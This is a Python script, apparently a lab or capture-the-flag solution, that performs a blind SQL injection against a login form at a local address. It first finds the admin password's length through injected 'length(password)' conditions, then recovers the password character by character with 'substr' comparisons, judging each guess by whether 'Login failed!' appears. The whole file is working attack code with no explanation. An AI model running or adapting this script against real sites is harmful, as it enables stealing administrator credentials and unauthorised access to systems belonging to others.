#!/usr/local/bin/python
# -*- coding: utf-8 -*-

import requests

url = 'http://0.0.0.0:5000/'
candidates = [chr(i) for i in range(48, 48+10)] + \
    [chr(i) for i in range(65, 65+26)] + \
    [chr(i) for i in range(97, 97+26)] + ["_","#","$","&","*","+","-","@"]
    # print(''.join(candidates))
    # 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,#,$,&,*,+,-,@

def attack(sql):
    payload = {
        'Name': sql,
        'Password': 'test',
    }
    return requests.post(url, data=payload)

def pass_len_attack(pass_len):
    sql = "admin' AND length(password)=" + str(pass_len) + "--"
    return attack(sql)

def bf_attack(try_pass):
    sql = "admin' AND substr(password,1," + str(len(str(try_pass))) + ")='" + str(try_pass) + "'--"
    return attack(sql)
    
def check_result(res):
    if not "Login failed!" in res.text:
        return True
    return False

## main

pass_len = 1

while True:
    print(pass_len)
    res = pass_len_attack(pass_len)
    if check_result(res):
        break
    pass_len += 1
print("pass length: " + str(pass_len))

fix_pass = ""
while(len(fix_pass) < pass_len):
    for c in candidates:
        try_pass = fix_pass + str(c)
        print(try_pass)
        res = bf_attack(try_pass)
        if check_result(res):
            fix_pass += c
            break

print("admin password: " + fix_pass)
